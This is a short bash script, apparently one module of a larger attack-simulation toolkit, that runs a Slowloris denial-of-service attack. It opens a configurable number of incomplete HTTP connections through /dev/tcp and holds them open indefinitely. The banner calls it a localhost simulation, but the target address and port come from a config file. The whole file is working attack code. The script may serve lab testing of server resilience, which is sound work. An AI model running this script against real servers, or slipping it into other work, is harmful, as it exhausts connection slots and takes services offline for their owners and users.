#!/bin/bash
# Slowloris Simulation Module
source ../config.cfg
source utils.sh

run_slowloris() {
    clear
    echo -e "${CYAN}Starting Slowloris Simulation (Localhost)...${NC}"
    echo -e "${YELLOW}Opening $SLOWLORIS_CONNS partial HTTP connections${NC}"
    
    # Create multiple partial connections
    echo -e "\n${RED}[+] Establishing connections...${NC}"
    for i in $(seq 1 $SLOWLORIS_CONNS); do
        (
            exec 3<>/dev/tcp/$TARGET_IP/$HTTP_PORT
            echo -e "GET / HTTP/1.1\r\nHost: localhost\r\n" >&3
            echo "Connection $i established (press Ctrl+C to close)"
            # Keep connection open
            while true; do sleep 3600; done
        ) &
    done
    
    # Show status
    echo -e "\n${GREEN}[+] $SLOWLORIS_CONNS connections opened"
    echo -e "Netstat output:"
    netstat -an | grep $HTTP_PORT | grep ESTABLISHED
    
    # Prompt to close
    echo -e "\n${RED}Press Enter to close connections${NC}"
    read
    kill $(jobs -p)
    
    log_event "Slowloris" "Connections:$SLOWLORIS_CONNS"
}

run_slowloris
